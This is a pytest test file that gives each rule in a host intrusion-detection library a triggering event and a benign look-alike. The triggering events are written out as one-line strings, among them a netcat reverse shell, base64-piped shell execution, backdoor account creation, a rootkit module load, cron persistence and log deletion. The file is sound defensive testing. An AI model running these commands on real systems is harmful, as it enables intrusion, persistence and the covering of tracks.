"""Per-rule positive/negative coverage for the shipped rule library.

Every rule under ``rules/`` must (a) have a test case here, (b) fire on an event
that represents the behavior it targets, and (c) stay silent on a benign
look-alike. The parametrization is driven by the *actually loaded* rules, so a
new rule file with no case fails ``test_every_rule_has_a_test_case`` — the
library can never grow an untested detection.
"""

from __future__ import annotations

from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from sentinel.detection.engine import DetectionEngine
from sentinel.detection.loader import load_rules
from sentinel.events import (
    Destination,
    Event,
    EventCategory,
    EventKind,
    EventMeta,
    EventOutcome,
    File,
    Host,
    Process,
    Source,
)

_RULES_DIR = Path(__file__).resolve().parent.parent / "rules"
RULES = load_rules(_RULES_DIR)
RULE_IDS = sorted(rule.id for rule in RULES)

BASE_TS = datetime(2026, 6, 22, 12, 0, 0, tzinfo=UTC)
_EID = "0" * 64

_AUTH = EventCategory.AUTHENTICATION
_PROC = EventCategory.PROCESS
_FILE = EventCategory.FILE
_NET = EventCategory.NETWORK


def ev(
    action: str,
    category: EventCategory,
    *,
    ip: str | None = None,
    port: int | None = None,
    user: str | None = None,
    dport: int | None = None,
    cmd: str | None = None,
    exe: str | None = None,
    fpath: str | None = None,
    fmode: str | None = None,
    ts: datetime | None = None,
) -> Event:
    """Build a minimal Event for rule testing."""
    return Event(
        timestamp=ts or BASE_TS,
        event=EventMeta(
            id=_EID,
            kind=EventKind.EVENT,
            category=category,
            action=action,
            outcome=EventOutcome.SUCCESS,
            severity=3,
        ),
        host=Host(name="host1"),
        source=Source(ip=ip, port=port, user=user),
        destination=Destination(port=dport),
        process=Process(command_line=cmd, executable=exe),
        file=File(path=fpath, mode=fmode) if fpath is not None else None,
        message="event",
    )


@dataclass(frozen=True)
class RuleCase:
    """Events that must fire a rule, and one benign event that must not."""

    positive: list[Event]
    negative: Event


# Five failed logins from one IP inside the window — the brute-force trigger.
_BRUTE = [
    ev("ssh_login_failed", _AUTH, ip="6.6.6.6", ts=BASE_TS + timedelta(seconds=i)) for i in range(5)
]

CASES: dict[str, RuleCase] = {
    "ssh-brute-force": RuleCase(
        positive=_BRUTE,
        negative=ev("ssh_login_failed", _AUTH, ip="6.6.6.6"),  # single attempt
    ),
    "ssh-root-login": RuleCase(
        positive=[ev("ssh_login_succeeded", _AUTH, user="root")],
        negative=ev("ssh_login_succeeded", _AUTH, user="alice"),
    ),
    "reverse-shell-process": RuleCase(
        positive=[ev("process_started", _PROC, cmd="nc -e /bin/sh 10.0.0.1 4444")],
        negative=ev("process_started", _PROC, cmd="cat /etc/hostname"),
    ),
    "shadow-file-modified": RuleCase(
        positive=[ev("file_modified", _FILE, fpath="/etc/shadow")],
        negative=ev("file_modified", _FILE, fpath="/etc/hosts"),
    ),
    "passwd-file-modified": RuleCase(
        positive=[ev("file_modified", _FILE, fpath="/etc/passwd")],
        negative=ev("file_modified", _FILE, fpath="/etc/group"),
    ),
    "sudoers-modified": RuleCase(
        positive=[ev("file_modified", _FILE, fpath="/etc/sudoers.d/90-evil")],
        negative=ev("file_modified", _FILE, fpath="/etc/hosts"),
    ),
    "cron-persistence": RuleCase(
        positive=[ev("file_created", _FILE, fpath="/etc/cron.d/backdoor")],
        negative=ev("file_created", _FILE, fpath="/home/user/notes.txt"),
    ),
    "new-suid-binary": RuleCase(
        positive=[ev("file_created", _FILE, fpath="/usr/local/bin/x", fmode="4755")],
        negative=ev("file_created", _FILE, fpath="/usr/local/bin/x", fmode="0755"),
    ),
    "world-writable-sensitive": RuleCase(
        positive=[ev("file_modified", _FILE, fpath="/etc/app.conf", fmode="0666")],
        negative=ev("file_modified", _FILE, fpath="/etc/app.conf", fmode="0644"),
    ),
    "base64-execution": RuleCase(
        positive=[ev("process_started", _PROC, cmd="echo ZWNobyBoaQ== | base64 -d | sh")],
        negative=ev("process_started", _PROC, cmd="python3 /opt/app/main.py"),
    ),
    "account-creation": RuleCase(
        positive=[ev("process_started", _PROC, cmd="useradd -m -s /bin/bash backdoor")],
        negative=ev("process_started", _PROC, cmd="ls -la /home"),
    ),
    "kernel-module-load": RuleCase(
        positive=[ev("process_started", _PROC, cmd="insmod /tmp/rootkit.ko")],
        negative=ev("process_started", _PROC, cmd="lsmod"),
    ),
    "suspicious-tmp-exec": RuleCase(
        positive=[ev("process_started", _PROC, exe="/tmp/.hidden/payload")],
        negative=ev("process_started", _PROC, exe="/usr/bin/python3"),
    ),
    "new-listening-service": RuleCase(
        positive=[ev("network_listen_started", _NET, port=4444)],
        negative=ev("network_listen_started", _NET, port=443),
    ),
    "c2-beacon-port": RuleCase(
        positive=[ev("network_connection_opened", _NET, dport=4444)],
        negative=ev("network_connection_opened", _NET, dport=443),
    ),
    "log-tampering": RuleCase(
        positive=[ev("file_deleted", _FILE, fpath="/var/log/auth.log")],
        negative=ev("file_deleted", _FILE, fpath="/tmp/scratch"),
    ),
    "interactive-shell-spawn": RuleCase(
        positive=[ev("process_started", _PROC, cmd="bash -i")],
        negative=ev("process_started", _PROC, cmd="bash /opt/deploy.sh"),
    ),
}


def _fired_ids(engine: DetectionEngine, events: list[Event]) -> set[str]:
    fired: set[str] = set()
    for event in events:
        fired.update(d.rule_id for d in engine.evaluate(event))
    return fired


def test_rule_library_is_not_empty() -> None:
    assert len(RULES) >= 15  # the directive's minimum


@pytest.mark.parametrize("rule_id", RULE_IDS)
def test_every_rule_has_a_test_case(rule_id: str) -> None:
    assert rule_id in CASES, f"rule {rule_id!r} has no positive/negative test case"


@pytest.mark.security
@pytest.mark.parametrize("rule_id", RULE_IDS)
def test_rule_fires_on_positive(rule_id: str) -> None:
    fired = _fired_ids(DetectionEngine(RULES), CASES[rule_id].positive)
    assert rule_id in fired


@pytest.mark.security
@pytest.mark.parametrize("rule_id", RULE_IDS)
def test_rule_silent_on_negative(rule_id: str) -> None:
    fired = _fired_ids(DetectionEngine(RULES), [CASES[rule_id].negative])
    assert rule_id not in fired
